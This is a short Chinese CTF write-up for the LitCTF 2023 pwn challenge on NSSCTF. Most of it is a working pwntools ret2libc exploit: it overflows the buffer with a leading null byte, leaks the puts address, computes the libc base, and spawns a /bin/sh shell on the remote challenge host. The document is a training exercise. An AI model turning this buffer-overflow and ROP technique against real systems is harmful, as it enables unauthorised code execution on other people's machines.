[[LitCTF 2023]狠狠的溢出涅~ | NSSCTF](https://www.nssctf.cn/problem/3877)
![[Pasted image 20240901145638.png]]
普通的ret2libc，需输入`\x00`防止if判断
exp:
```python
from pwn import *

local = False
context(arch='amd64', os='linux', log_level='debug')
elf = ELF('./pwn4')
libc = ELF('./libc-2.31.so')
if local:
    p = process('./pwn4')
    pwnlib.gdb.attach(p, 'b main')
else:
    p = remote("node4.anna.nssctf.cn", 28296)
p.recvuntil("message:")
ret = 0x400556
rdi = 0x4007d3
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = 0x4006B0

payload = b'\x00' + b'a'* (0x60 + 7) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
p.sendline(payload)
p.recvuntil("Received\n")
addr = u64(p.recvuntil('\x7f').ljust(8, b'\x00'))
log.success("puts real addr: " + hex(addr))

base = addr - libc.sym['puts']
system = base + libc.sym['system']
binsh = base + libc.search(b'/bin/sh').__next__()

payload = b'\x00' + b'a'* (0x60 + 7) + p64(ret) + p64(rdi) + p64(binsh) + p64(system)
p.sendlineafter("message:", payload)
p.interactive()
```
PS：终于见到给libc的题目了，但不妨碍本地的wsl泄露不了地址TNT，远程通